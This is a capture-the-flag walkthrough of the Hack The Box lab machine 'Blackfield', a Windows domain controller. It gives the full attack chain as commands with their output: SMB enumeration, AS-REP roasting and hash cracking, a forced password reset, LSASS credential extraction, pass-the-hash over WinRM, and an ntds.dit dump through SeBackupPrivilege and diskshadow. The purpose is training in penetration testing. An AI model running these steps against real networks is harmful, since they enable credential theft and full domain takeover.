---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: false
---

# Blackfield

### Walkthrough Summary

[Blackfield](https://app.hackthebox.com/machines/255) is a <mark style="color:orange;">hard-rated</mark> box

| Step | Action                 | Tool                                                                                                                                                                                                             | Achieved                                           |
| ---- | ---------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------- |
| 1    | SMB Enumeration        | [NetExec](https://github.com/Pennyw0rth/NetExec)                                                                                                                                                                 | Obtained usernames                                 |
| 2    | ASREPRoasting          | [GetNPUsers](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py)                                                                                                                              | Obtained password for _support_                    |
| 3    | Domain Enumeration     | [BloodHound.py](https://github.com/dirkjanm/BloodHound.py), [BloodHound](https://github.com/BloodHoundAD/BloodHound)                                                                                             | Obtained credentials for _audit2020_               |
| 4    | SMB Enumeration        | [NetExec](https://github.com/Pennyw0rth/NetExec), [pypykatz](https://github.com/skelsec/pypykatz)                                                                                                                | Obtained hash for _svc\_backup_ (initial foothold) |
| 5    | Privilege Exploitation | [diskshadow](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow), [robocopy](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy) | Exfiltrated _ntds.dit_ & _system.hive_             |
| 6    | Hash Dump              | [SecretsDump](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py), [NetExec](https://github.com/Pennyw0rth/NetExec)                                                                          | Compromised domain                                 |

### Attack Chain Reproduction Steps

Let's start with an Nmap port scan (Figure 1):

```bash
sudo nmap 10.10.10.192 -T4 -p- -A -open
```

<figure><img src="../../.gitbook/assets/blackfield_nmap.png" alt=""><figcaption><p>Figure 1: Scanning Blackfield's ports.</p></figcaption></figure>

There are some interesting results returned from Nmap:

* The FQDN is `DC01.BLACKFIELD.LOCAL`.
* Based on the hostname (`DC01`) and the fact it has services such as DNS, Kerberos, LDAP, and SMB, we can safely assume that it is a Domain Controller (DC).&#x20;
* WinRM is available on port `5985`.

Before proceed to enumerate the SMB and LDAP services, we should add the hostname, domain name and FQDN on our local DNS file:

```bash
$ grep blackfield /etc/hosts
10.10.10.192    blackfield.local dc01 dc01.blackfield.local
```

Asking the SMB for information related to shares, users and password policy, it comes back with just the shares (Figure 2). There are 2 non-default shares: `forensic` and `profiles$`. We can only `READ` the latter, and spidering it comes back with a long list of usernames (Figure 3).

{% code overflow="wrap" %}
```bash
# enumerating SMB shares
nxc smb 10.10.10.192 -u 'guest' -p '' --shares
# spidering the profiles$ share
nxc smb 10.10.10.192 -u 'guest' -p '' --spider profiles\$ --regex . --depth 0
```
{% endcode %}

<figure><img src="../../.gitbook/assets/blackfield_shares.png" alt=""><figcaption><p>Figure 2: Enumerating SMB shares.</p></figcaption></figure>

<figure><img src="../../.gitbook/assets/blackfield_profile_share.png" alt=""><figcaption><p>Figure 3: Spidering the profiles$ share.</p></figcaption></figure>

Let's create a username list based on the information provided from the `profiles$` share:

{% code overflow="wrap" %}
```bash
# writing nxc's output to a file
nxc smb 10.10.10.192 -u 'guest' -p '' --spider profiles\$ --regex . --depth 0 > nxc_users
# manually remove the junk lines
nano nxc_users
# extract the usernames
cat nxc_users | grep '[dir]' | cut -d'/' -f5 | cut -d' ' -f1 | sort | uniq > domain_users
```
{% endcode %}

Putting our username list to work right away and checking for any [ASREPRoastable](../../tl-dr/tl-dr/active-directory/asreproasting.md) accounts (Figure 4), we get back `support`'s hash, which we pass and crack with [Hashcat](../../tools/tools/passwords/hashcat.md) (Figure 5).

{% code overflow="wrap" %}
```bash
# asreproasting with netexec
nxc ldap 10.10.10.192 -u domain_users -p '' --asreproast asrep_users --continue-on-success
# cracking the hash with hashcat
hashcat -m18200 asrep_users /usr/share/wordlists/rockyou.txt
# showing the results
hashcat asrep_users --show
```
{% endcode %}

<figure><img src="../../.gitbook/assets/blackfield_asreproast.png" alt=""><figcaption><p>Figure 4: ASREPRoasting with NetExec.</p></figcaption></figure>

<figure><img src="../../.gitbook/assets/blackfield_support_pass.png" alt=""><figcaption><p>Figure 5: Cracking the hash with Hashcat.</p></figcaption></figure>

With a valid domain user account we can re-enumerate SMB. Unfortunately, `support` cannot read the `forensic` share, but it does let us know that there is no danger of account lockouts (Figure 6). In addition, enumerating domain users returns many junk accounts which we can sort out as before (Figure 7).

{% code overflow="wrap" %}
```bash
# enumerating SMB with valid domain credentials
nxc smb 10.10.10.192 -u support -p support_pass --shares --pass-pol
# enumerating domain users via SMB
nxc smb 10.10.10.192 -u support -p support_pass --users
```
{% endcode %}

<figure><img src="../../.gitbook/assets/blackfield_pass_pol.png" alt=""><figcaption><p>Figure 6: Enumerating share access and domain's password policy.</p></figcaption></figure>

We can also collect domain information and let **Bloodhound** analyze it:

```bash
$ bloodhound-python -u support -p '#0<REDACTED>ht' -dc dc01.blackfield.local -c all -d BLACKFIELD.LOCAL -ns 10.10.10.192
INFO: Found AD domain: blackfield.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 18 computers
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 316 users
INFO: Found 52 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
<SNIP>
INFO: Querying computer: DC01.BLACKFIELD.local
WARNING: Failed to get service ticket for DC01.BLACKFIELD.local, falling back to NTLM auth
CRITICAL: CCache file is not found. Skipping...
WARNING: DCE/RPC connection failed: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Done in 00M 06S
```

It seems that the account `support` can change the password of the account `audit2020`:

```bash
# change user's password
$ net rpc password 'audit2020' 'p@ssw0rd!' -U "blackfield.local/support%#0<REDACTED>ht" -S dc01.blackfield.local

# confirm credentials
$ nxc smb 10.10.10.192 -u audit2020 -p 'p@ssw0rd!'
SMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\audit2020:p@ssw0rd!
```

> _We can also change the user's password using_ [_`rpcclient`_](https://malicious.link/posts/2017/reset-ad-user-password-with-linux/)_._

Check the conent of the **forensic** share:

```bash
$ nxc smb 10.10.10.192 -u audit2020 -p 'p@ssw0rd!' --share forensic -M spider_plus
SMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\audit2020:p@ssw0rd!
SPIDER_P... 10.10.10.192    445    DC01             [*] Started module spidering_plus with the following options:
SPIDER_P... 10.10.10.192    445    DC01             [*]  DOWNLOAD_FLAG: False
SPIDER_P... 10.10.10.192    445    DC01             [*]     STATS_FLAG: True
SPIDER_P... 10.10.10.192    445    DC01             [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_P... 10.10.10.192    445    DC01             [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_P... 10.10.10.192    445    DC01             [*]  MAX_FILE_SIZE: 50 KB
SPIDER_P... 10.10.10.192    445    DC01             [*]  OUTPUT_FOLDER: /tmp/nxc_spider_plus
SMB         10.10.10.192    445    DC01             [*] Enumerated shares
SMB         10.10.10.192    445    DC01             Share           Permissions     Remark
SMB         10.10.10.192    445    DC01             -----           -----------     ------
SMB         10.10.10.192    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.10.192    445    DC01             C$                              Default share
SMB         10.10.10.192    445    DC01             forensic        READ            Forensic / Audit share.
SMB         10.10.10.192    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.10.192    445    DC01             NETLOGON        READ            Logon server share
SMB         10.10.10.192    445    DC01             profiles$       READ
SMB         10.10.10.192    445    DC01             SYSVOL          READ            Logon server share
SPIDER_P... 10.10.10.192    445    DC01             [+] Saved share-file metadata to "/tmp/nxc_spider_plus/10.10.10.192.json".
SPIDER_P... 10.10.10.192    445    DC01             [*] SMB Shares:           7 (ADMIN$, C$, forensic, IPC$, NETLOGON, profiles$, SYSVOL)
SPIDER_P... 10.10.10.192    445    DC01             [*] SMB Readable Shares:  5 (forensic, IPC$, NETLOGON, profiles$, SYSVOL)
SPIDER_P... 10.10.10.192    445    DC01             [*] SMB Filtered Shares:  1
SPIDER_P... 10.10.10.192    445    DC01             [*] Total folders found:  368
SPIDER_P... 10.10.10.192    445    DC01             [*] Total files found:    725
SPIDER_P... 10.10.10.192    445    DC01             [*] File size average:    978.9 KB
SPIDER_P... 10.10.10.192    445    DC01             [*] File size min:        0 B
SPIDER_P... 10.10.10.192    445    DC01             [*] File size max:        125.87 MB
```

It seems that among the files there is a **LSASS memory dump** which we can download locally:

```bash
# read output file
$ jq . /tmp/nxc_spider_plus/10.10.10.192.json
<SNIP>
    },
    "memory_analysis/lsass.zip": {
      "atime_epoch": "2020-05-28 21:25:08",
      "ctime_epoch": "2020-05-28 21:25:01",
      "mtime_epoch": "2020-05-28 21:29:24",
      "size": "39.99 MB"
    },
<SNIP>

# download file
$ nxc smb 10.10.10.192 -u audit2020 -p 'p@ssw0rd!' --share forensic --get-file memory_analysis/lsass.zip lsass.zip
SMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\audit2020:p@ssw0rd!
SMB         10.10.10.192    445    DC01             [*] Copying "memory_analysis/lsass.zip" to "lsass.zip"
SMB         10.10.10.192    445    DC01             [+] File "memory_analysis/lsass.zip" was downloaded to "lsass.zip"
```

We can use [`pypykatz`](https://github.com/skelsec/pypykatz) to extract the data from the LSASS file:

```bash
# unzip the lsass dump
$ unzip lsass.zip
Archive:  lsass.zip
  inflating: lsass.DMP

# extract the data
$ pypykatz lsa minidump lsass.DMP
INFO:pypykatz:Parsing file lsass.DMP
FILE: ======== lsass.DMP =======
<SNIP>
        == MSV ==
                Username: svc_backup
                Domain: BLACKFIELD
                LM: NA
                NT: 96<REDACTED>0d
<SNIP>
        == MSV ==
                Username: Administrator
                Domain: BLACKFIELD
                LM: NA
                NT: 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
<SNIP>
```

The hash for the `Administrator` account does not work, but for the `svc_backup` account does:

```bash
$ nxc winrm 10.10.10.192 -u svc_backup -H 96<REDACTED>0d
SMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
WINRM       10.10.10.192    5985   DC01             [+] BLACKFIELD.local\svc_backup:96<REDACTED>0d (Pwn3d!)
```

Get a shell as `svc_backup` and compromise `user.txt`:

```bash
$ evil-winrm -i 10.10.10.192 -u svc_backup -H 96<REDACTED>0d

<SNIP>
*Evil-WinRM* PS C:\Users\svc_backup\Documents> type ..\desktop\user.txt
39<REDACTED>43
```

Check user's information:

```bash
*Evil-WinRM* PS C:\Users\svc_backup\Documents> whoami /all

<SNIP>

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
<SNIP>


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

We can exploit the **SeBackupPrivilege** ([_Windows Privilege Escalation: SeBackupPrivilege_](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/)) and dump the `ntds.dit` database by:

* Writing a small script for the [**diskshadow**](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow) utility to expose the _c:_ drive
* Convert the script in a Windows-compatible format
* Upload the script on the target
* Move to a directory with write access
* Expose the shadow copy
* Download the `ntds.dit` database

```bash
# write a diskshadow script
$ cat diskshadow_script
set context persistent nowriters
add volume c: alias random
create
expose %random% z:

# convert file into a Windows-compatible format
$ sudo unix2dos diskshadow_script
unix2dos: converting file diskshadow_script to DOS format...
```

Next, within the WinRM session:

```bash
# upload script
*Evil-WinRM* PS C:\Users\svc_backup\Documents> upload diskshadow_script

Info: Uploading /home/kali/htb/ad_track/diskshadow_script to C:\Users\svc_backup\Documents\diskshadow_script

Data: 120 bytes of 120 bytes copied

Info: Upload successful!

# move within a writeable directory
*Evil-WinRM* PS C:\Windows\Temp> cd c:\windows\temp

# expose the shadow copy
*Evil-WinRM* PS C:\Windows\Temp> diskshadow /s diskshadow_script
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  3/21/2024 6:40:33 AM

-> set context persistent nowriters
-> add volume c: alias random
-> create
Alias random for shadow ID {c1b9f0fc-55fe-4df8-b9d6-cc09d5be207a} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {b33e3fe9-4ce7-481a-8ce7-968ce59f77ec} set as environment variable.

Querying all shadow copies with the shadow copy set ID {b33e3fe9-4ce7-481a-8ce7-968ce59f77ec}

        * Shadow copy ID = {c1b9f0fc-55fe-4df8-b9d6-cc09d5be207a}               %random%
                - Shadow copy set: {b33e3fe9-4ce7-481a-8ce7-968ce59f77ec}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{6cd5140b-0000-0000-0000-602200000000}\ [C:\]
                - Creation time: 3/21/2024 6:40:34 AM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
                - Originating machine: DC01.BLACKFIELD.local
                - Service machine: DC01.BLACKFIELD.local
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %random% z:
-> %random% = {c1b9f0fc-55fe-4df8-b9d6-cc09d5be207a}
The shadow copy was successfully exposed as z:\.
->

# copy the ntds.dit database
*Evil-WinRM* PS C:\Windows\Temp> robocopy /b z:\windows\ntds . ntds.dit

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Thursday, March 21, 2024 6:44:01 AM
   Source : z:\windows\ntds\
     Dest : C:\Windows\Temp\

    Files : ntds.dit

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

                           1    z:\windows\ntds\
            New File              18.0 m        ntds.dit
<SNIP>
100%

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         0         1         0         0         0
   Files :         1         1         0         0         0         0
   Bytes :   18.00 m   18.00 m         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00


   Speed :           109734697 Bytes/sec.
   Speed :            6279.069 MegaBytes/min.
   Ended : Thursday, March 21, 2024 6:44:01 AM

# download the file
*Evil-WinRM* PS C:\Windows\Temp> download ntds.dit

Info: Downloading C:\Windows\Temp\ntds.dit to ntds.dit

Info: Download successful!
```

We also need to exfiltrate the `system.hive` file:

```bash
# make a copy of the file
*Evil-WinRM* PS C:\windows\temp> reg save HKlM\SYSTEM C:\windows\temp\system.hive
The operation completed successfully.

# download the file
*Evil-WinRM* PS C:\> download system.hive

Info: Downloading C:\\system.hive to system.hive

Info: Download successful!
```

Now the `Administrator` hash can be easily dumped which let us compromise the `root.txt` file:

```bash
# dump the administrator hash
$ secretsdump -ntds ntds.dit -system system.hive LOCAL | grep Admin
Administrator:500:aad3b435b51404eeaad3b435b51404ee:18<REDACTED>ee:::
Administrator:aes256-cts-hmac-sha1-96:dbd84e6cf174af55675b4927ef9127a12aade143018c78fbbe568d394188f21f
Administrator:aes128-cts-hmac-sha1-96:8148b9b39b270c22aaa74476c63ef223
Administrator:des-cbc-md5:5d25a84ac8c229c1

# compromise the root.txt file
$ nxc smb 10.10.10.192 -u administrator -H 18<REDACTED>ee -x 'type c:\users\administrator\desktop\root.txt'
SMB         10.10.10.192    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\administrator:18<REDACTED>ee (Pwn3d!)
SMB         10.10.10.192    445    DC01             [+] Executed command via wmiexec
SMB         10.10.10.192    445    DC01             43<REDACTED>cb
```
